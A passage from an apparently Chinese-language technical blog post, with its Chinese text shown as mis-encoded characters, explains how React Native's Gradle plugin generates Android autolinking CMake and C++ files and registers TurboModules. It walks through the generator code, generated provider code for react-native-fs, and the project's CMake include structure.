      <span class="hljs-comment">// ä»dependenciesä¸­æå–æ‰€æœ‰Androidå¹³å°çš„é…ç½®ï¼Œå¦‚æœä¸ºç©ºåˆ™è¿”å›ç©ºåˆ—è¡¨</span>
      model?.dependencies?.values?.mapNotNull { it.platforms?.android } ?: emptyList()

  <span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">generateCmakeFileContent</span><span class="hljs-params">(
      packages: <span class="hljs-type">List</span>&lt;<span class="hljs-type">ModelAutolinkingDependenciesPlatformAndroidJson</span>&gt;
  )</span></span>: String {
    <span class="hljs-keyword">val</span> libraryIncludes =
        packages.joinToString(<span class="hljs-string">"\n"</span>) { dep -&gt;
          <span class="hljs-keyword">var</span> addDirectoryString = <span class="hljs-string">""</span>
          <span class="hljs-keyword">val</span> libraryName = dep.libraryName  <span class="hljs-comment">// è·å–åº“åç§°</span>
          <span class="hljs-comment">// è·å–CMakeLists.txtæ–‡ä»¶è·¯å¾„</span>
          <span class="hljs-comment">// ç”¨äºCodegenç”Ÿæˆçš„TurboModule/Fabricç»„ä»¶,ç”Ÿæˆçš„åº“åï¼šreact_codegen_${libraryName}</span>
          <span class="hljs-comment">// é€šè¿‡ autolinking_ModuleProvider() æä¾› Java TurboModule    </span>
          <span class="hljs-keyword">val</span> cmakeListsPath = dep.cmakeListsPath

          <span class="hljs-comment">// ç”¨äºçº¯C++ TurboModule,ç”Ÿæˆçš„åº“åç”±ç¬¬ä¸‰æ–¹åº“çš„CMakeLists.txtè‡ªå®šä¹‰</span>
          <span class="hljs-comment">// é€šè¿‡ autolinking_cxxModuleProvider() æä¾› C++ TurboModule</span>
          <span class="hljs-keyword">val</span> cxxModuleCMakeListsPath = dep.cxxModuleCMakeListsPath
          <span class="hljs-keyword">if</span> (libraryName != <span class="hljs-literal">null</span> &amp;&amp; cmakeListsPath != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å¦‚æœç”¨æˆ·æä¾›äº†è‡ªå®šä¹‰çš„ cmakeListsPathï¼Œåˆ™ä½¿ç”¨å®ƒ</span>
            <span class="hljs-keyword">val</span> nativeFolderPath = sanitizeCmakeListsPath(cmakeListsPath)
            addDirectoryString +=
                <span class="hljs-string">"add_subdirectory(\"<span class="hljs-variable">$nativeFolderPath</span>\" <span class="hljs-subst">${libraryName}</span>_autolinked_build)"</span>
          }
          <span class="hljs-keyword">if</span> (cxxModuleCMakeListsPath != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å¦‚æœç”¨æˆ·æä¾›äº†è‡ªå®šä¹‰çš„cxxModuleCMakeListsPathï¼Œåˆ™ä½¿ç”¨å®ƒ</span>
            <span class="hljs-keyword">val</span> nativeFolderPath = sanitizeCmakeListsPath(cxxModuleCMakeListsPath)
            addDirectoryString +=
                <span class="hljs-string">"\nadd_subdirectory(\"<span class="hljs-variable">$nativeFolderPath</span>\" <span class="hljs-subst">${libraryName}</span>_cxxmodule_autolinked_build)"</span>
          }
          addDirectoryString
        }

    <span class="hljs-comment">// ç”Ÿæˆåº“æ¨¡å—åˆ—è¡¨ï¼šæ”¶é›†æ‰€æœ‰éœ€è¦è‡ªåŠ¨é“¾æ¥çš„åº“åç§°</span>
    <span class="hljs-keyword">val</span> libraryModules =
        packages.joinToString(<span class="hljs-string">"\n  "</span>) { dep -&gt;
          <span class="hljs-keyword">var</span> autolinkedLibraries = <span class="hljs-string">""</span>
          <span class="hljs-comment">// å¦‚æœå­˜åœ¨åº“åç§°ï¼Œæ·»åŠ ä»£ç ç”Ÿæˆåº“å‰ç¼€</span>
          <span class="hljs-keyword">if</span> (dep.libraryName != <span class="hljs-literal">null</span>) {
            autolinkedLibraries += <span class="hljs-string">"<span class="hljs-variable">$CODEGEN_LIB_PREFIX</span><span class="hljs-subst">${dep.libraryName}</span>"</span>
          }
          <span class="hljs-keyword">if</span> (dep.cxxModuleCMakeListsModuleName != <span class="hljs-literal">null</span>) {
            autolinkedLibraries += <span class="hljs-string">"\n<span class="hljs-subst">${dep.cxxModuleCMakeListsModuleName}</span>"</span>
          }
          autolinkedLibraries
        }

    <span class="hljs-keyword">return</span> CMAKE_TEMPLATE.replace(<span class="hljs-string">"{{ libraryIncludes }}"</span>, libraryIncludes)
        .replace(<span class="hljs-string">"{{ libraryModules }}"</span>, libraryModules)
  }

  <span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">generateCppFileContent</span><span class="hljs-params">(
      packages: <span class="hljs-type">List</span>&lt;<span class="hljs-type">ModelAutolinkingDependenciesPlatformAndroidJson</span>&gt;
  )</span></span>: String {
    <span class="hljs-comment">// è¿‡æ»¤å‡ºæœ‰åº“åç§°çš„åŒ…ï¼ˆåªæœ‰è¿™äº›åŒ…æ‰éœ€è¦ç”ŸæˆC++ä»£ç ï¼‰</span>
    <span class="hljs-keyword">val</span> packagesWithLibraryNames = packages.filter { android -&gt; android.libraryName != <span class="hljs-literal">null</span> }

    <span class="hljs-keyword">val</span> cppIncludes =
        packagesWithLibraryNames.joinToString(<span class="hljs-string">"\n"</span>) { dep -&gt;
          <span class="hljs-keyword">var</span> include = <span class="hljs-string">"#include &lt;<span class="hljs-subst">${dep.libraryName}</span>.h&gt;"</span>
          <span class="hljs-keyword">if</span> (dep.componentDescriptors.isNotEmpty()) {
            include +=
                <span class="hljs-string">"\n#include &lt;<span class="hljs-subst">${COMPONENT_INCLUDE_PATH}</span>/<span class="hljs-subst">${dep.libraryName}</span>/<span class="hljs-subst">${COMPONENT_DESCRIPTOR_FILENAME}</span>&gt;"</span>
          }
          <span class="hljs-keyword">if</span> (dep.cxxModuleHeaderName != <span class="hljs-literal">null</span>) {
            include += <span class="hljs-string">"\n#include &lt;<span class="hljs-subst">${dep.cxxModuleHeaderName}</span>.h&gt;"</span>
          }
          include
        }

    <span class="hljs-comment">// ç”ŸæˆJava TurboModuleæä¾›è€…çš„C++ä»£ç </span>
    <span class="hljs-keyword">val</span> cppTurboModuleJavaProviders =
        packagesWithLibraryNames.joinToString(<span class="hljs-string">"\n"</span>) { dep -&gt;
          <span class="hljs-keyword">val</span> libraryName = dep.libraryName
          <span class="hljs-comment">// language=cpp</span>
          <span class="hljs-string">"""  
      auto module_<span class="hljs-variable">$libraryName</span> = <span class="hljs-subst">${libraryName}</span>_ModuleProvider(moduleName, params);
      if (module_<span class="hljs-variable">$libraryName</span> != nullptr) {
      return module_<span class="hljs-variable">$libraryName</span>;
      }
      """</span>
              .trimIndent()
        }

    <span class="hljs-comment">// ç”ŸæˆC++ TurboModuleæä¾›è€…çš„ä»£ç </span>
    <span class="hljs-keyword">val</span> cppTurboModuleCxxProviders =
        packagesWithLibraryNames
            .filter { it.cxxModuleHeaderName != <span class="hljs-literal">null</span> }
            .joinToString(<span class="hljs-string">"\n"</span>) { dep -&gt;
              <span class="hljs-keyword">val</span> cxxModuleHeaderName = dep.cxxModuleHeaderName
              <span class="hljs-comment">// language=cpp</span>
              <span class="hljs-string">"""
      if (moduleName == <span class="hljs-variable">$cxxModuleHeaderName</span>::kModuleName) {
      return std::make_shared&lt;<span class="hljs-variable">$cxxModuleHeaderName</span>&gt;(jsInvoker);
      }
      """</span>
                  .trimIndent()
            }

    <span class="hljs-keyword">val</span> cppComponentDescriptors =
        packagesWithLibraryNames
            .filter { it.componentDescriptors.isNotEmpty() }
            .joinToString(<span class="hljs-string">"\n"</span>) {
              it.componentDescriptors.joinToString(<span class="hljs-string">"\n"</span>) {
                <span class="hljs-string">"providerRegistry-&gt;add(concreteComponentDescriptorProvider&lt;<span class="hljs-variable">$it</span>&gt;());"</span>
              }
            }

    <span class="hljs-keyword">return</span> CPP_TEMPLATE.replace(<span class="hljs-string">"{{ autolinkingCppIncludes }}"</span>, cppIncludes)
        .replace(<span class="hljs-string">"{{ autolinkingCppTurboModuleJavaProviders }}"</span>, cppTurboModuleJavaProviders)
        .replace(<span class="hljs-string">"{{ autolinkingCppTurboModuleCxxProviders }}"</span>, cppTurboModuleCxxProviders)
        .replace(<span class="hljs-string">"{{ autolinkingCppComponentDescriptors }}"</span>, cppComponentDescriptors)
  }

  <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> CMAKE_FILENAME = <span class="hljs-string">"Android-autolinking.cmake"</span>

    <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> H_FILENAME = <span class="hljs-string">"autolinking.h"</span>
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> CPP_FILENAME = <span class="hljs-string">"autolinking.cpp"</span>
    <span class="hljs-comment">// Reactä»£ç ç”Ÿæˆåº“çš„å‰ç¼€</span>
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> CODEGEN_LIB_PREFIX = <span class="hljs-string">"react_codegen_"</span>
    <span class="hljs-comment">// ç»„ä»¶æè¿°ç¬¦å¤´æ–‡ä»¶å</span>
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> COMPONENT_DESCRIPTOR_FILENAME = <span class="hljs-string">"ComponentDescriptors.h"</span>
    <span class="hljs-comment">// ç»„ä»¶çš„åŒ…å«è·¯å¾„å‰ç¼€</span>
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> COMPONENT_INCLUDE_PATH = <span class="hljs-string">"react/renderer/components"</span>

   <span class="hljs-comment">/**
     * æ¸…ç†CMakeLists.txtè·¯å¾„ï¼Œç§»é™¤æ–‡ä»¶åéƒ¨åˆ†å¹¶è½¬ä¹‰ç©ºæ ¼å­—ç¬¦
     */</span>
    <span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">sanitizeCmakeListsPath</span><span class="hljs-params">(cmakeListsPath: <span class="hljs-type">String</span>)</span></span>: String =
        cmakeListsPath.replace(<span class="hljs-string">"CMakeLists.txt"</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">" "</span>, <span class="hljs-string">"\\ "</span>)

    <span class="hljs-comment">// language=cmake</span>
    <span class="hljs-keyword">val</span> CMAKE_TEMPLATE =
        <span class="hljs-string">"""
        # This code was generated by [React Native](https://www.npmjs.com/package/@react-native/gradle-plugin)
        cmake_minimum_required(VERSION 3.13)
        set(CMAKE_VERBOSE_MAKEFILE on)

        # We set REACTNATIVE_MERGED_SO so libraries/apps can selectively decide to depend on either libreactnative.so
        # or link against a old prefab target (this is needed for React Native 0.76 on).
        set(REACTNATIVE_MERGED_SO true)

        {{ libraryIncludes }}

        set(AUTOLINKED_LIBRARIES
          {{ libraryModules }}
        )
        """</span>
            .trimIndent()

    <span class="hljs-comment">// language=cpp</span>
    <span class="hljs-keyword">val</span> CPP_TEMPLATE =
        <span class="hljs-string">"""
        /**
         * This code was generated by [React Native](https://www.npmjs.com/package/@react-native/gradle-plugin).
         *
         * Do not edit this file as changes may cause incorrect behavior and will be lost
         * once the code is regenerated.
         *
         */

        #include "autolinking.h"
        {{ autolinkingCppIncludes }}

        namespace facebook {
        namespace react {

        std::shared_ptr&lt;TurboModule&gt; autolinking_ModuleProvider(const std::string moduleName, const JavaTurboModule::InitParams &amp;params) {
        {{ autolinkingCppTurboModuleJavaProviders }}
          return nullptr;
        }

        std::shared_ptr&lt;TurboModule&gt; autolinking_cxxModuleProvider(const std::string moduleName, const std::shared_ptr&lt;CallInvoker&gt;&amp; jsInvoker) {
        {{ autolinkingCppTurboModuleCxxProviders }}
          return nullptr;
        }

        void autolinking_registerProviders(std::shared_ptr&lt;ComponentDescriptorProviderRegistry const&gt; providerRegistry) {
        {{ autolinkingCppComponentDescriptors }}
          return;
        }

        } // namespace react
        } // namespace facebook
        """</span>
            .trimIndent()

    <span class="hljs-comment">// language=cpp</span>
    <span class="hljs-keyword">val</span> hTemplate =
        <span class="hljs-string">"""
        /**
         * This code was generated by [React Native](https://www.npmjs.com/package/@react-native/gradle-plugin).
         *
         * Do not edit this file as changes may cause incorrect behavior and will be lost
         * once the code is regenerated.
         *
         */

        #pragma once

        #include &lt;ReactCommon/CallInvoker.h&gt;
        #include &lt;ReactCommon/JavaTurboModule.h&gt;
        #include &lt;ReactCommon/TurboModule.h&gt;
        #include &lt;jsi/jsi.h&gt;
        #include &lt;react/renderer/componentregistry/ComponentDescriptorProviderRegistry.h&gt;

        namespace facebook {
        namespace react {

        std::shared_ptr&lt;TurboModule&gt; autolinking_ModuleProvider(const std::string moduleName, const JavaTurboModule::InitParams &amp;params);
        std::shared_ptr&lt;TurboModule&gt; autolinking_cxxModuleProvider(const std::string moduleName, const std::shared_ptr&lt;CallInvoker&gt;&amp; jsInvoker);
        void autolinking_registerProviders(std::shared_ptr&lt;ComponentDescriptorProviderRegistry const&gt; providerRegistry);

        } // namespace react
        } // namespace facebook
        """</span>
            .trimIndent()
  }
}
</code></pre>
<p>æ­¤å¤„éœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œæœ‰ä¸¤ä¸ªcmakeè·¯å¾„ï¼š<code>cmakeListsPath</code>å’Œ<code>cxxModuleCMakeListsPath</code></p>
<ul>
<li><strong>cmakeListsPath</strong>ï¼šç¼–è¯‘ç”±Codegenç”Ÿæˆçš„TurboModule/Fabricç»„ä»¶ï¼Œåº“åç§°æ˜¯<code>react_codegen_${libraryName}</code>ï¼Œä½¿ç”¨<code>autolinking_ModuleProvider()</code>å‡½æ•°æ³¨å†Œã€‚ç®€å•è¯´ï¼Œå°±æ˜¯ä»JSè§„èŒƒè‡ªåŠ¨ç”Ÿæˆçš„ç›¸å…³ä»£ç ï¼Œä¸»è¦å°±åŸºäºåŸç”Ÿçš„TurboModuleã€‚</li>
<li><strong>cxxModuleCMakeListsPath</strong>ï¼šä¸»è¦å°±æ˜¯æˆ‘ä»¬æ‰‹å†™çš„çº¯C++TurboModuleï¼Œåº“åç§°ç”±æˆ‘ä»¬è‡ªå®šä¹‰ï¼Œä½¿ç”¨<code>autolinking_cxxModuleProvider()</code>æ³¨å†Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬æ‰“ç®—å¼€å‘ä¸€ä¸ªçº¯C++TurboModuleï¼Œé‚£ä¹ˆæ­¤è·¯å¾„å°±æ˜¯å¿…é¡»è¦æä¾›çš„</li>
</ul>
<p><strong>è¿™é‡Œæœ‰ä¸€ä¸ªç–‘é—®ï¼Œå‰é¢æˆ‘ä»¬åˆ†æäº†åŸºäºåŸç”Ÿçš„TurboModule(å³Java TurboModule)æ˜¯é€šè¿‡è‡ªåŠ¨ç”Ÿæˆ<code>PackageList</code>ç±»æ¥å®ç°æ³¨å†Œçš„ï¼Œé‚£ä¹ˆè¿™é‡Œçš„<code>autolinking_ModuleProvider</code>åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ˜¯å¦å‡ºç°äº†é‡å¤æ³¨å†Œï¼Ÿ</strong></p>
<p>å…¶å®åœ¨ä¸Šé¢<strong>Java TurboModule</strong> åˆ†æä¸€èŠ‚ï¼Œæˆ‘ä»¬å·²ç»è§¦åŠåˆ°äº†è¿™ä¸ªé—®é¢˜ã€‚å›é¡¾ä¸€ä¸‹ï¼Œé‚£é‡Œæåˆ°äº†ä¸¤å±‚æŸ¥æ‰¾ï¼Œé¦–å…ˆæ˜¯åå°„kotlinç±»çš„<code>getTurboJavaModule</code>æ–¹æ³•ï¼Œè·å–åˆ°äº†é€šè¿‡<code>PackageList</code>æ³¨å†Œçš„TurboModule çš„Kotlinç±»å¯¹è±¡ï¼Œç„¶åå°†æ­¤å¯¹è±¡å°è£…æˆä¸€ä¸ªå‚æ•°ç»§ç»­è°ƒç”¨C++å±‚çš„<code>getTurboModule</code>è¿”å›ä¸€ä¸ªC++å±‚çš„TurboModuleå¯¹è±¡ï¼Œæœ€ç»ˆæ˜¯å°†è¿™ä¸ªC++ TurboModuleå®ä¾‹å¯¹è±¡æ·»åŠ åˆ°ç¼“å­˜ä¸­ï¼Œç”¨äºä¸‹æ¬¡ç›´æ¥ä½¿ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªRNçš„ç¬¬ä¸‰æ–¹TurboModuleåº“ï¼Œå…¶æ–¹æ³•è°ƒç”¨æ˜¯ä½¿ç”¨è¿™ä¸ªC++ TurboModuleå®ä¾‹å¯¹è±¡ï¼Œè€Œä¸æ˜¯Kotlinå®ç°çš„TurboModuleå¯¹è±¡ã€‚</p>
<p>è¦æƒ³å¼„æ˜ç™½è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªhelloé¡¹ç›®ï¼Œåœ¨é¡¹ç›®ä¸­ä»»æ„æ·»åŠ ä¸€ä¸ªä¸‰æ–¹TurboModuleã€‚è­¬å¦‚æˆ‘è¿™é‡Œæ·»åŠ ï¼š<code>"@dr.pogodin/react-native-fs"</code>ï¼Œç„¶åå®‰è£…ä¾èµ–ï¼Œå¹¶æ„å»ºé¡¹ç›®ï¼Œå°±ä¼šè‡ªåŠ¨è§¦å‘codegenã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬æ¥æŸ¥çœ‹ç”Ÿæˆçš„<code>autolinking_ModuleProvider</code>ï¼Œæºç <code>hello/android/app/build/generated/autolinking/src/main/jni/autolinking.cpp</code></p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-function">std::shared_ptr&lt;TurboModule&gt; <span class="hljs-title">autolinking_ModuleProvider</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string moduleName, <span class="hljs-type">const</span> JavaTurboModule::InitParams &amp;params)</span> </span>{
  <span class="hljs-keyword">auto</span> module_RNReactNativeFsSpec = <span class="hljs-built_in">RNReactNativeFsSpec_ModuleProvider</span>(moduleName, params);
  <span class="hljs-keyword">if</span> (module_RNReactNativeFsSpec != <span class="hljs-literal">nullptr</span>) {
      <span class="hljs-keyword">return</span> module_RNReactNativeFsSpec;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
}
</code></pre>
<p>æºç <code>node_modules/@dr.pogodin/react-native-fs/android/generated/jni/RNReactNativeFsSpec-generated.cpp</code>ï¼š</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-function">std::shared_ptr&lt;TurboModule&gt; <span class="hljs-title">RNReactNativeFsSpec_ModuleProvider</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string &amp;moduleName, <span class="hljs-type">const</span> JavaTurboModule::InitParams &amp;params)</span> </span>{
  <span class="hljs-keyword">if</span> (moduleName == <span class="hljs-string">"ReactNativeFs"</span>) {
    <span class="hljs-keyword">return</span> std::<span class="hljs-built_in">make_shared</span>&lt;NativeReactNativeFsSpecJSI&gt;(params);
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
}

NativeReactNativeFsSpecJSI::<span class="hljs-built_in">NativeReactNativeFsSpecJSI</span>(<span class="hljs-type">const</span> JavaTurboModule::InitParams &amp;params)
  : <span class="hljs-built_in">JavaTurboModule</span>(params) {
  methodMap_[<span class="hljs-string">"getConstants"</span>] = MethodMetadata {<span class="hljs-number">0</span>, __hostFunction_NativeReactNativeFsSpecJSI_getConstants};
  methodMap_[<span class="hljs-string">"addListener"</span>] = MethodMetadata {<span class="hljs-number">1</span>, __hostFunction_NativeReactNativeFsSpecJSI_addListener};
  methodMap_[<span class="hljs-string">"removeListeners"</span>] = MethodMetadata {<span class="hljs-number">1</span>, __hostFunction_NativeReactNativeFsSpecJSI_removeListeners};
  methodMap_[<span class="hljs-string">"appendFile"</span>] = MethodMetadata {<span class="hljs-number">2</span>, __hostFunction_NativeReactNativeFsSpecJSI_appendFile};
  methodMap_[<span class="hljs-string">"copyFile"</span>] = MethodMetadata {<span class="hljs-number">3</span>, __hostFunction_NativeReactNativeFsSpecJSI_copyFile};
  <span class="hljs-comment">// çœç•¥......</span>
}

<span class="hljs-type">static</span> facebook::jsi::Value __hostFunction_NativeReactNativeFsSpecJSI_getConstants(facebook::jsi::Runtime&amp; rt, TurboModule &amp;turboModule, <span class="hljs-type">const</span> facebook::jsi::Value* args, <span class="hljs-type">size_t</span> count) {
  <span class="hljs-type">static</span> jmethodID cachedMethodId = <span class="hljs-literal">nullptr</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">static_cast</span>&lt;JavaTurboModule &amp;&gt;(turboModule).<span class="hljs-built_in">invokeJavaMethod</span>(rt, ObjectKind, <span class="hljs-string">"getConstants"</span>, <span class="hljs-string">"()Ljava/util/Map;"</span>, args, count, cachedMethodId);
}
</code></pre>
<p>æœ€ç»ˆè¿”å›çš„æ˜¯ä¸€ä¸ªè‡ªåŠ¨ç”Ÿæˆçš„<code>NativeReactNativeFsSpecJSI</code>å¯¹è±¡æŒ‡é’ˆã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹å£°æ˜ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">/**
 * JNI C++ class for module 'NativeReactNativeFs'
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">JSI_EXPORT</span> NativeReactNativeFsSpecJSI : <span class="hljs-keyword">public</span> JavaTurboModule {
<span class="hljs-keyword">public</span>:
  <span class="hljs-built_in">NativeReactNativeFsSpecJSI</span>(<span class="hljs-type">const</span> JavaTurboModule::InitParams &amp;params);
};
</code></pre>
<p>å¯è§ï¼Œ<code>NativeReactNativeFsSpecJSI</code>å°±æ˜¯ä¸€ä¸ªæ´¾ç”Ÿè‡ª<code>JavaTurboModule</code>çš„å­ç±»ã€‚åœ¨å…¶æ„é€ æ–¹æ³•ä¸­ï¼Œä¸º<code>methodMap_</code>æ³¨å†Œäº†å¾ˆå¤šæ–¹æ³•ã€‚è¿™äº›æ–¹æ³•ä¹Ÿå°±æ˜¯æä¾›ç»™ä¸Šå±‚JSè°ƒç”¨çš„ã€‚æŸ¥çœ‹ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼Œå‘ç°å®ƒè¿˜æ˜¯åå°„çš„Kotlinçš„TurboModuleå®ç°ç±»çš„æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç»•äº†ä¸€å¤§åœˆï¼Œæœ€ç»ˆè°ƒç”¨çš„ä»ç„¶æ˜¯Kotlinç¼–å†™çš„TurboModuleå®ç°ã€‚ç”Ÿæˆçš„<code>PackageList</code>ä»…ç”¨äºé¦–æ¬¡æ³¨å†Œæ¨¡å—ï¼Œåç»­çš„æ–¹æ³•è°ƒç”¨åŸºæœ¬éƒ½æ˜¯åŸºäº<code>NativeReactNativeFsSpecJSI</code>çš„åå°„ã€‚å½“ç„¶ï¼Œè¿™é‡Œçš„åå°„ä¹Ÿè¿›è¡Œäº†ä¸€äº›ä¼˜åŒ–ï¼Œåªä¼šåå°„ä¸€æ¬¡ã€‚</p>
<p>æ¨æµ‹ä¹‹æ‰€ä»¥è¦è¿™æ ·åšï¼Œå¤§æ¦‚å°±æ˜¯æœ‰ä¸¤ç‚¹ï¼Œä¸€æ˜¯ä¸ºäº†å…¼å®¹æ—§æ¶æ„åŸºäº<code>PackageList</code>æ³¨å†Œæ¨¡å—çš„æœºåˆ¶ï¼Œç¬¬äºŒæ˜¯ä¸ºäº†æ”¯æŒæ›´è‡ªåŠ¨åŒ–çš„Codegenã€‚å¦‚æœç›´æ¥åå°„Kotlinçš„TurboModuleå®ç°ç±»å®Œæˆè°ƒç”¨ï¼Œå°±æ²¡åŠæ³•è‡ªåŠ¨è§„èŒƒåŒ–æ¥å£ã€‚ç®€å•è¯´ï¼Œå½“æˆ‘ä»¬ç”¨TSå®šä¹‰å¥½æ¥å£APIåï¼ŒCodegenå¯ä»¥æ ¹æ®æ¥å£çš„å‡½æ•°ç­¾åï¼Œè‡ªåŠ¨å¯¹å‚æ•°ã€è¿”å›å€¼ç±»å‹è¿›è¡ŒJSIç±»å‹æ˜ å°„ï¼Œæ— éœ€æ¨¡å—å¼€å‘è€…æ“å¿ƒã€‚<code>NativeReactNativeFsSpecJSI</code>ç±»å°±æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„æ–¹æ³•ç±»å‹æ˜ å°„ï¼Œè¿™æ˜¯åŸºäºç¼–è¯‘æ—¶ç”Ÿæˆçš„ï¼Œç›¸æ¯”è¿è¡Œæ—¶æ‰‹åŠ¨å¤„ç†æ›´å®‰å…¨ã€‚</p>
<p>å†çœ‹ä¸€ä¸‹è¯¥ä¸‰æ–¹åº“åœ¨<code>node_modules</code>ä¸­çš„æ–‡ä»¶ç»“æ„ï¼š</p>
<pre><code class="hljs language-java" lang="java">node_modules/                  
â”œâ”€â”€ <span class="hljs-meta">@dr</span>.pogodin/react-<span class="hljs-keyword">native</span>-fs                         â† ä¸‰æ–¹TurboModule
    â””â”€â”€ android
             â””â”€â”€generated/
                    â””â”€â”€ jni/
                                    â””â”€â”€ CMakeLists.txt
                                    |â”€â”€ RNReactNativeFsSpec.h
                                    |â”€â”€ RNReactNativeFsSpec-generated.cpp
</code></pre>
<p>æ˜¾ç„¶çš„ï¼Œè¿™é‡Œçš„<code>CMakeLists.txt</code>å°±æ˜¯ä¸Šé¢<strong>cmakeListsPath</strong>è·¯å¾„æŒ‡å‘çš„æ–‡ä»¶ï¼Œç”¨äºç¼–è¯‘å½“å‰ç›®å½•ä¸‹è‡ªåŠ¨ç”Ÿæˆçš„C++ä»£ç <code>RNReactNativeFsSpec-generated.cpp</code></p>
<p>æœ€åæ€»ç»“ä¸€ä¸‹ï¼Œä¸€ä¸ªReact Nativeé¡¹ç›®ä¸­çš„cmakeå…³ç³»ï¼š</p>
<pre><code class="hljs language-objectivec" lang="objectivec">hello/
â”œâ”€â”€ android/
â”‚   â”œâ”€â”€ settings.gradle                              â“ª Gradle é…ç½®å…¥å£
â”‚   â”œâ”€â”€ build.gradle                                 â“ª æ ¹ build.gradle
â”‚   â”‚
â”‚   â””â”€â”€ app/
â”‚       â”œâ”€â”€ build.gradle                             â“ª App build.gradle (åº”ç”¨ react æ’ä»¶)
â”‚       â”‚
â”‚       â”œâ”€â”€ src/main/
â”‚       â”‚   â””â”€â”€ res/...
â”‚       â”‚
â”‚       â””â”€â”€ build/
â”‚           â”œâ”€â”€ generated/
â”‚           â”‚   â””â”€â”€ autolinking/
â”‚           â”‚       â””â”€â”€ src/main/
â”‚           â”‚           â”œâ”€â”€ java/com/facebook/react/
â”‚           â”‚           â”‚   â””â”€â”€ PackageList.java   â“¹ ç”Ÿæˆçš„ Java åŒ…åˆ—è¡¨
â”‚           â”‚           â”‚
â”‚           â”‚           â””â”€â”€ jni/
â”‚           â”‚               â”œâ”€â”€ Android-autolinking.cmake  â“· ç”Ÿæˆçš„ <span class="hljs-built_in">CMake</span> é…ç½®
â”‚           â”‚               â”œâ”€â”€ autolinking.h              â“¹ ç”Ÿæˆçš„ C++ å¤´æ–‡ä»¶
â”‚           â”‚               â””â”€â”€ autolinking.cpp            â“¸ ç”Ÿæˆçš„ C++ å®ç°
â”‚
â””â”€â”€ node_modules/
    â”œâ”€â”€ react-native/
    â”‚   â””â”€â”€ ReactAndroid/
    â”‚       â””â”€â”€ cmake-utils/
    â”‚           â”œâ”€â”€ <span class="hljs-keyword">default</span>-app-setup/
    â”‚           â”‚   â”œâ”€â”€ <span class="hljs-built_in">CMakeLists</span>.txt             â“µ å…¥å£ <span class="hljs-built_in">CMakeLists</span>.txt
    â”‚           â”‚   â””â”€â”€ OnLoad.cpp                 â“º JNI å…¥å£ç‚¹
    â”‚           â”‚
    â”‚           â”œâ”€â”€ ReactNative-application.cmake  â“¶ æ ¸å¿ƒæ„å»ºé€»è¾‘
    â”‚           â””â”€â”€ folly-flags.cmake              â“ª Folly ç¼–è¯‘é€‰é¡¹
    â”‚
    â””â”€â”€ react-native-third-party/
        â””â”€â”€ android/
            â”œâ”€â”€ build.gradle                       â“ª ç¬¬ä¸‰æ–¹åº“ Gradle
            â””â”€â”€ build/generated/source/codegen/jni/
                â””â”€â”€ <span class="hljs-built_in">CMakeLists</span>.txt                 â“º ç¬¬ä¸‰æ–¹åº“ <span class="hljs-built_in">CMake</span>
</code></pre>
<p>CMakeåŒ…å«å…³ç³»ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">default-app-setup/CMakeLists<span class="hljs-selector-class">.txt</span>
â”‚
â”œâ”€ <span class="hljs-built_in">include</span>(${REACT_ANDROID_DIR}/cmake-utils/ReactNative-application.cmake)
â”‚  â”‚
â”‚  ReactNative-application<span class="hljs-selector-class">.cmake</span>
â”‚  â”‚
â”‚  â”œâ”€ <span class="hljs-built_in">include</span>(${CMAKE_CURRENT_LIST_DIR}/folly-flags.cmake)
â”‚  â”‚  â””â”€ è®¾ç½® Folly ç¼–è¯‘é€‰é¡¹
â”‚  â”‚
â”‚  â”œâ”€ <span class="hljs-built_in">include</span>(${PROJECT_BUILD_DIR}/generated/autolinking/src/main/jni/Android-autolinking.cmake)
â”‚  â”‚  â”‚
â”‚  â”‚  Android-autolinking<span class="hljs-selector-class">.cmake</span>
â”‚  â”‚  â”‚
â”‚  â”‚  â””â”€ <span class="hljs-built_in">add_subdirectory</span>(
â”‚  â”‚        "/path/to/node_modules/react-native-third-party/android/generated/jni/"
â”‚  â”‚        RNReactNativeFsSpec_autolinked_build
â”‚  â”‚     )
â”‚  â”‚     â”‚
â”‚  â”‚     react-native-third-party/CMakeLists<span class="hljs-selector-class">.txt</span>
â”‚  â”‚     â”‚
â”‚  â”‚     â””â”€ <span class="hljs-built_in">add_library</span>(react_codegen_RNReactNativeFsSpec OBJECT ${react_codegen_SRCS})
â”‚  â”‚
â”‚  â””â”€ <span class="hljs-built_in">add_subdirectory</span>(${BUILD_DIR}/generated/source/codegen/jni/)
